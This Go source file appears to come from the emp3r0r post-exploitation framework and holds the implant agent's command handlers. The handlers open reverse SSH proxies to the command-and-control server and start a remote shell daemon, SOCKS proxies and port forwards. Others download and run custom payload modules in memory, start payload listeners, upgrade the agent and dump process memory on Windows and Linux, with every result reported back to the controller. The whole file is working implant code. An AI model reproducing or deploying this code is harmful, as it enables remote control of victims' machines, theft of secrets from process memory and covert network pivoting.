package agent

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/listener"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// runListDir implements !ls --path <path>
func runListDir(cmd *cobra.Command, args []string) {
	outBuf := new(bytes.Buffer)
	path, _ := cmd.Flags().GetString("path")
	if path == "" {
		outBuf.WriteString("Error: args error\n")
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	var listPath string
	switch path {
	case ".":
		cwd, err := os.Getwd()
		if err != nil {
			outBuf.WriteString(fmt.Sprintf("Error: %v\n", err))
			SendCmdRespToC2(outBuf.String(), cmd, args)
			return
		}
		listPath = cwd
	default:
		absPath, err := filepath.Abs(path)
		if err != nil {
			outBuf.WriteString(fmt.Sprintf("Error: %v\n", err))
			SendCmdRespToC2(outBuf.String(), cmd, args)
			return
		}
		listPath = absPath
	}
	entries, err := os.ReadDir(listPath)
	if err != nil {
		outBuf.WriteString(fmt.Sprintf("Error: cant read dir %s: %v\n", listPath, err))
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	outBuf.WriteString(listPath)
	for _, entry := range entries {
		if entry.IsDir() {
			outBuf.WriteString(fmt.Sprintf("\n%s/", entry.Name()))
		} else {
			outBuf.WriteString(fmt.Sprintf("\n%s", entry.Name()))
		}
	}
	SendCmdRespToC2(outBuf.String(), cmd, args)
}

// runStat implements !stat --path <path>
func runStat(cmd *cobra.Command, args []string) {
	outBuf := new(bytes.Buffer)
	path, _ := cmd.Flags().GetString("path")
	if path == "" {
		outBuf.WriteString("Error: args error\n")
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	fi, err := os.Stat(path)
	if err != nil || fi == nil {
		outBuf.WriteString(fmt.Sprintf("Error: cant stat file %s: %v\n", path, err))
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	fstat := &util.FileStat{
		Name:       util.FileBaseName(path),
		Size:       fi.Size(),
		Checksum:   tun.SHA256SumFile(path),
		Permission: fi.Mode().String(),
	}
	data, err := json.Marshal(fstat)
	if err != nil {
		outBuf.WriteString(fmt.Sprintf("Error: cant marshal file info %s: %v\n", path, err))
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	outBuf.WriteString(string(data))
	SendCmdRespToC2(outBuf.String(), cmd, args)
}

// runBring2CC implements !bring2cc --addr <target> --kcp <on/off>
func runBring2CC(cmd *cobra.Command, args []string) {
	outBuf := new(bytes.Buffer)
	addr, _ := cmd.Flags().GetString("addr")
	kcp, _ := cmd.Flags().GetString("kcp")
	if addr == "" {
		outBuf.WriteString("Error: no address\n")
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	useKCP := kcp == "on"
	outBuf.WriteString(fmt.Sprintf("Bring2CC: Reverse proxy for %s finished\n", addr))

	hasInternet := tun.TestConnectivity(emp3r0r_def.CCAddress, RuntimeConfig.C2TransportProxy)
	isProxyOK := tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_def.CCAddress)
	if !hasInternet && !isProxyOK {
		outBuf.WriteString("Error: We don't have any internet to share\n")
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	// cancel any existing reverse connection for this addr
	for p, cancelfunc := range ReverseConns {
		if addr == p {
			cancelfunc()
		}
	}
	targetAddrWithPort := fmt.Sprintf("%s:%s", addr, RuntimeConfig.Bring2CCReverseProxyPort)
	ctx, cancel := context.WithCancel(context.Background())
	kcpListenPort := fmt.Sprintf("%d", util.RandInt(10000, 60000))
	if useKCP {
		targetAddrWithPort = fmt.Sprintf("127.0.0.1:%s", kcpListenPort)
		kcpServerAddr := fmt.Sprintf("%s:%s", addr, RuntimeConfig.KCPServerPort)
		go tun.KCPTunClient(kcpServerAddr, kcpListenPort, RuntimeConfig.Password, emp3r0r_def.MagicString, ctx, cancel)
		util.TakeABlink()
	}
	proxyPort, err := strconv.Atoi(RuntimeConfig.AgentSocksServerPort)
	if err != nil {
		outBuf.WriteString(fmt.Sprintf("Error: %v\n", err))
		cancel()
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	err = tun.SSHReverseProxyClient(targetAddrWithPort, RuntimeConfig.Password, proxyPort, &ReverseConns, emp3r0r_def.ProxyServer, ctx, cancel)
	if err != nil {
		outBuf.WriteString(err.Error() + "\n")
	}
	SendCmdRespToC2(outBuf.String(), cmd, args)
}

// runSSHD implements !sshd --shell <shell> --port <port> --args <args>
func runSSHD(cmd *cobra.Command, args []string) {
	outBuf := new(bytes.Buffer)
	shell, _ := cmd.Flags().GetString("shell")
	port, _ := cmd.Flags().GetString("port")
	sshdArgs, _ := cmd.Flags().GetStringSlice("args")
	if shell == "" || port == "" {
		outBuf.WriteString("Error: args error\n")
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	log.Printf("Got sshd request: %v", args)
	errChan := make(chan error)
	go func() {
		errChan <- SSHD(shell, port, sshdArgs)
	}()
	for !tun.IsPortOpen("127.0.0.1", port) {
		time.Sleep(50 * time.Millisecond)
	}
	select {
	case err := <-errChan:
		if err != nil {
			outBuf.WriteString(fmt.Sprintf("Error: %v\n", err))
		} else {
			outBuf.WriteString("success\n")
		}
	case <-time.After(3 * time.Second):
		outBuf.WriteString("SSHD started successfully\n")
	}
	SendCmdRespToC2(outBuf.String(), cmd, args)
}

// runProxy implements !proxy --mode <mode> --addr <address>
func runProxy(cmd *cobra.Command, args []string) {
	outBuf := new(bytes.Buffer)
	mode, _ := cmd.Flags().GetString("mode")
	addr, _ := cmd.Flags().GetString("addr")
	if mode == "" || addr == "" {
		outBuf.WriteString("Error: args error\n")
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	log.Printf("Got proxy request: %v", args)
	err := Socks5Proxy(mode, addr)
	if err != nil {
		outBuf.WriteString(fmt.Sprintf("Error: Failed to start Socks5Proxy: %v\n", err))
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	outBuf.WriteString(fmt.Sprintf("Socks5Proxy server ready with username %s and password %s\n",
		RuntimeConfig.ShadowsocksLocalSocksPort, RuntimeConfig.Password))
	SendCmdRespToC2(outBuf.String(), cmd, args)
}

// runPortFwd implements !port_fwd --to <target> --shID <session_id> --operation <operation> --timeout <timeout>
func runPortFwd(cmd *cobra.Command, args []string) {
	outBuf := new(bytes.Buffer)
	to, _ := cmd.Flags().GetString("to")
	sessionID, _ := cmd.Flags().GetString("shID")
	operation, _ := cmd.Flags().GetString("operation")
	timeout, _ := cmd.Flags().GetInt("timeout")
	if to == "" || sessionID == "" || operation == "" {
		outBuf.WriteString("Error: Invalid command\n")
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	errChan := make(chan error)
	switch operation {
	case "stop":
		if pf, exist := PortFwds[sessionID]; exist {
			pf.Cancel()
			outBuf.WriteString(fmt.Sprintf("Warning: port mapping %s stopped\n", pf.Addr))
			SendCmdRespToC2(outBuf.String(), cmd, args)
			return
		}
		outBuf.WriteString("Error: port mapping not found\n")
	case "reverse":
		go func() {
			errChan <- PortFwd(to, sessionID, "tcp", true, 0)
		}()
	default:
		go func() {
			errChan <- PortFwd(to, sessionID, operation, false, timeout)
		}()
	}
	select {
	case err := <-errChan:
		if err != nil {
			outBuf.WriteString(fmt.Sprintf("Error: %v\n", err))
		}
	case <-time.After(3 * time.Second):
		outBuf.WriteString("Port forwarding started successfully\n")
	}
	SendCmdRespToC2(outBuf.String(), cmd, args)
}

// runDeletePortFwd implements !delete_portfwd --id <session_id>
func runDeletePortFwd(cmd *cobra.Command, args []string) {
	outBuf := new(bytes.Buffer)
	id, _ := cmd.Flags().GetString("id")
	if id == "" {
		return
	}
	for sessionID, session := range PortFwds {
		if sessionID == id {
			session.Cancel()
		}
	}
	SendCmdRespToC2(outBuf.String(), cmd, args)
}

// runUtils implements !utils --checksum <checksum> --download_addr <download_addr>
func runUtils(cmd *cobra.Command, args []string) {
	outBuf := new(bytes.Buffer)
	checksum, _ := cmd.Flags().GetString("checksum")
	downloadAddr, _ := cmd.Flags().GetString("download_addr")
	if checksum == "" {
		outBuf.WriteString("Error: args error\n")
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	out := VaccineHandler(downloadAddr, checksum)
	if out != "[+] Utils have been successfully installed" {
		outBuf.WriteString(fmt.Sprintf("Error: %s\n", out))
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	outBuf.WriteString(out + "\n")
	SendCmdRespToC2(outBuf.String(), cmd, args)
}

// runCustomModule implements !custom_module --mod_name <name> --exec <command> --env <env> --checksum <checksum> --in_mem <bool> --type <payload_type> --file_to_download <file> --download_addr <addr>
func runCustomModule(cmd *cobra.Command, args []string) {
	outBuf := new(bytes.Buffer)
	modName, _ := cmd.Flags().GetString("mod_name")
	execCmd, _ := cmd.Flags().GetString("exec")
	checksum, _ := cmd.Flags().GetString("checksum")
	inMem, _ := cmd.Flags().GetBool("in_mem")
	payloadType, _ := cmd.Flags().GetString("type")
	fileToDownload, _ := cmd.Flags().GetString("file_to_download")
	env, _ := cmd.Flags().GetString("env")
	downloadAddr, _ := cmd.Flags().GetString("download_addr")
	if modName == "" || checksum == "" {
		outBuf.WriteString("Error: args error\n")
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	envParsed := strings.Split(env, ",")
	out := moduleHandler(downloadAddr, fileToDownload, payloadType, modName, checksum, execCmd, envParsed, inMem)
	outBuf.WriteString(out + "\n")
	SendCmdRespToC2(outBuf.String(), cmd, args)
}

// runUpdateAgent implements !upgrade_agent --checksum <checksum>
func runUpdateAgent(cmd *cobra.Command, args []string) {
	outBuf := new(bytes.Buffer)
	checksum, _ := cmd.Flags().GetString("checksum")
	if checksum == "" {
		outBuf.WriteString("Error: args error\n")
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	out := Upgrade(checksum)
	outBuf.WriteString(out + "\n")
	SendCmdRespToC2(outBuf.String(), cmd, args)
}

// runListener implements !listener --listener <listener> --port <port> --payload <payload> --compression <on/off> --passphrase <passphrase>
func runListener(cmd *cobra.Command, args []string) {
	outBuf := new(bytes.Buffer)
	listenerType, _ := cmd.Flags().GetString("listener")
	port, _ := cmd.Flags().GetString("port")
	payload, _ := cmd.Flags().GetString("payload")
	compression, _ := cmd.Flags().GetString("compression")
	passphrase, _ := cmd.Flags().GetString("passphrase")
	if payload == "" {
		outBuf.WriteString("Error: payload not specified\n")
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	log.Printf("Got listener request: %v", args)
	errChan := make(chan error)
	if listenerType == "http_aes_compressed" {
		go func() {
			errChan <- listener.HTTPAESCompressedListener(payload, port, passphrase, compression == "on")
		}()
	} else if listenerType == "http_bare" {
		go func() {
			errChan <- listener.HTTPBareListener(payload, port)
		}()
	}
	select {
	case err := <-errChan:
		if err != nil {
			outBuf.WriteString(fmt.Sprintf("Error: %v\n", err))
		}
	case <-time.After(3 * time.Second):
		outBuf.WriteString("Listener started successfully\n")
	}
	SendCmdRespToC2(outBuf.String(), cmd, args)
}

// runFileServer implements !file_server --port <port> --switch <on/off>
func runFileServer(cmd *cobra.Command, args []string) {
	outBuf := new(bytes.Buffer)
	port, _ := cmd.Flags().GetString("port")
	serverSwitch, _ := cmd.Flags().GetString("switch")
	portInt, err := strconv.Atoi(port)
	if err != nil {
		outBuf.WriteString(fmt.Sprintf("Error parsing port: %v\n", err))
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	if serverSwitch == "on" {
		outBuf.WriteString(fmt.Sprintf("File server on port %s is now %s\n", port, serverSwitch))
		if FileServerCtx != nil {
			FileServerCancel()
		}
		FileServerCtx, FileServerCancel = context.WithCancel(context.Background())
		go FileServer(portInt, FileServerCtx, FileServerCancel)
	} else {
		if FileServerCtx != nil {
			FileServerCancel()
		}
		outBuf.WriteString(fmt.Sprintf("File server on port %s is now %s\n", port, serverSwitch))
	}
	SendCmdRespToC2(outBuf.String(), cmd, args)
}

// runFileDownloader implements !file_downloader --download_addr <url> --path <path> --checksum <checksum>
func runFileDownloader(cmd *cobra.Command, args []string) {
	outBuf := new(bytes.Buffer)
	url, _ := cmd.Flags().GetString("download_addr")
	path, _ := cmd.Flags().GetString("path")
	checksum, _ := cmd.Flags().GetString("checksum")
	if url == "" || path == "" {
		outBuf.WriteString("Error: args error\n")
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	downloadPath := fmt.Sprintf("%s/%s", RuntimeConfig.AgentRoot, util.FileBaseName(path))
	err := RequestAndDownloadFile(url, path, downloadPath, checksum)
	if err != nil {
		outBuf.WriteString(fmt.Sprintf("Error: %v\n", err))
	} else {
		outBuf.WriteString(fmt.Sprintf("File downloaded to %s\n", path))
	}
	SendCmdRespToC2(outBuf.String(), cmd, args)
}

// runMemDump implements !mem_dump --pid <pid>
func runMemDump(cmd *cobra.Command, args []string) {
	outBuf := new(bytes.Buffer)
	pid, _ := cmd.Flags().GetInt("pid")
	if pid == 0 {
		outBuf.WriteString("Error: invalid PID\n")
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	outPath := fmt.Sprintf("%s/%d", RuntimeConfig.AgentRoot, pid)
	err := os.MkdirAll(outPath, 0700)
	if err != nil {
		outBuf.WriteString(fmt.Sprintf("Error: %v\n", err))
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	tarball := fmt.Sprintf("%d.tar.xz", pid)
	switch runtime.GOOS {
	case "windows":
		tarball = strings.ReplaceAll(tarball, "\\", "/")
		filePath := fmt.Sprintf("%s/%d.bin", outPath, pid)
		err = util.MiniDumpProcess(pid, filePath)
		if err != nil {
			outBuf.WriteString(fmt.Sprintf("Error (minidump): %v\n", err))
			SendCmdRespToC2(outBuf.String(), cmd, args)
			return
		}
	case "linux":
		dumpedData, err := util.DumpProcMem(pid)
		if err != nil {
			outBuf.WriteString(fmt.Sprintf("Error: %v\n", err))
			SendCmdRespToC2(outBuf.String(), cmd, args)
			return
		}
		for base, data := range dumpedData {
			filePath := fmt.Sprintf("%s/%d_%d.bin", outPath, pid, base)
			err = os.WriteFile(filePath, data, 0600)
			if err != nil {
				outBuf.WriteString(fmt.Sprintf("Error: %v\n", err))
				SendCmdRespToC2(outBuf.String(), cmd, args)
				return
			}
		}
	}
	err = os.Chdir(RuntimeConfig.AgentRoot)
	if err != nil {
		outBuf.WriteString(fmt.Sprintf("Error: %v\n", err))
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	err = util.TarXZ(fmt.Sprintf("%d", pid), tarball)
	if err != nil {
		outBuf.WriteString(fmt.Sprintf("Error: %v\n", err))
		SendCmdRespToC2(outBuf.String(), cmd, args)
		return
	}
	defer os.RemoveAll(outPath)
	outBuf.WriteString(tarball + "\n")
	SendCmdRespToC2(outBuf.String(), cmd, args)
}
